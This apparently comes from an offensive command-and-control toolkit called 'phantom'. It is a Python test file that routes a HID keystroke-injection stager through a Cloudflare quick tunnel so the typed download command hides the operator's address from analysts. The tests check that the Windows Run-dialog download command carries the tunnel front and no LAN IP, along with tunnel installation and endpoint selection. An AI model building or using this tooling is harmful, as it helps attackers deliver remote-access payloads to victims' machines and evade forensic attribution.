"""The public hop (`c2.front`) — the address a HID board types is not ours.

A tunnel is the answer to "the payload must not carry our IP", because a hash
cannot be dialled: anything the TARGET can reconstruct, an analyst holding the
board can reconstruct too. What DOES hold is indirection — the typed string
names a throwaway public host, and that host forwards to the local listener.

These tests pin the three things that silently broke the chain when this was
wired up by hand:

  * reading the assigned hostname out of cloudflared's banner;
  * `c2.front` actually reaching the artefact (`payload hid` used to be handed
    the listener's own address, so the front never entered the typed command);
  * no bogus "port mismatch" warning when the port belongs to the edge.
"""
import io
import tarfile
import urllib.request

from phantom.utils import network
from phantom.utils import tunnel as tn
from phantom.utils.short_stager import hid_download_command

FRONT = "quiet-river-9081.trycloudflare.com"


def _tarball(member: str, payload: bytes) -> bytes:
    """A gzipped tar with exactly one regular file."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as archive:
        info = tarfile.TarInfo(member)
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def test_parse_public_url_from_banner():
    banner = ("2026-11-01T10:00:00Z INF |  https://quiet-river-9081."
              "trycloudflare.com  |")
    assert tn.parse_public_url(banner) == (
        "https://quiet-river-9081.trycloudflare.com")
    assert tn.parse_public_url("starting tunnel") == ""


def test_host_of_is_the_form_c2_front_expects():
    assert tn.host_of("https://quiet-river-9081.trycloudflare.com") == (
        "quiet-river-9081.trycloudflare.com:443")
    assert tn.host_of("") == ""


def test_front_outranks_the_local_address(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    ep = network.c2_endpoint_status(host="192.168.1.155")
    assert (ep.host, ep.port, ep.use_ssl) == (FRONT, 443, True)
    assert ep.via_front is True


def test_front_does_not_raise_a_port_mismatch_warning(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    # A live listener on another port is the NORMAL shape behind a front.
    ep = network.C2Endpoint(FRONT, 443, True, True, 9443, False,
                            via_front=True)
    problems = [p for p in ep.warnings() if "MISMATCH" in p]
    assert problems == []


def test_hid_command_carries_the_front_and_no_lan_ip(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    ep = network.c2_endpoint_status()
    command = hid_download_command("windows", ep.host, ep.port, token="t0k",
                                   ssl=ep.use_ssl, attempts=1)
    assert FRONT in command
    assert "192.168." not in command
    assert len(command) <= 250      # the Windows Run dialog's own limit


def test_explicit_host_override_still_wins(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    monkeypatch.setenv("PHANTOM_C2_HOST", "10.1.2.3")
    ep = network.c2_endpoint_status()
    assert ep.host == "10.1.2.3"
    assert ep.via_front is False


def test_install_extracts_a_tarball_asset(monkeypatch, tmp_path):
    """macOS ships `cloudflared-darwin-*.tgz`.

    Writing those bytes straight to `data/bin/cloudflared` and chmod-ing them
    does not produce an executable, so on that platform `install` reported
    success and every `tunnel start` then said "not found". The extraction
    branch must write the MEMBER, not the archive.
    """
    monkeypatch.setattr(tn, "BIN_DIR", tmp_path)
    monkeypatch.setattr(tn, "_asset_name",
                        lambda: "cloudflared-darwin-arm64.tgz")
    monkeypatch.setattr(tn, "_runs", lambda path: True)
    monkeypatch.setattr(tn, "_MIN_INSTALL_BYTES", 1)  # a fixture-sized tarball
    blob = _tarball("cloudflared", b"#!/bin/sh\necho cloudflared version 1\n")

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    monkeypatch.setattr(urllib.request, "urlopen", lambda *a, **k: _Resp(blob))

    path, err = tn.install()
    assert err == ""
    written = open(path, "rb").read()
    # the EXECUTABLE, not the archive that wrapped it
    assert written.startswith(b"#!/bin/sh")
    assert b"\x1f\x8b" not in written[:4]


def test_apply_and_clear_front(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_FRONT", raising=False)
    assert tn.apply_front("https://quiet-river-9081.trycloudflare.com") == (
        f"{FRONT}:443")
    assert tn.current_front() == f"{FRONT}:443"
    tn.clear_front()
    assert tn.current_front() == ""
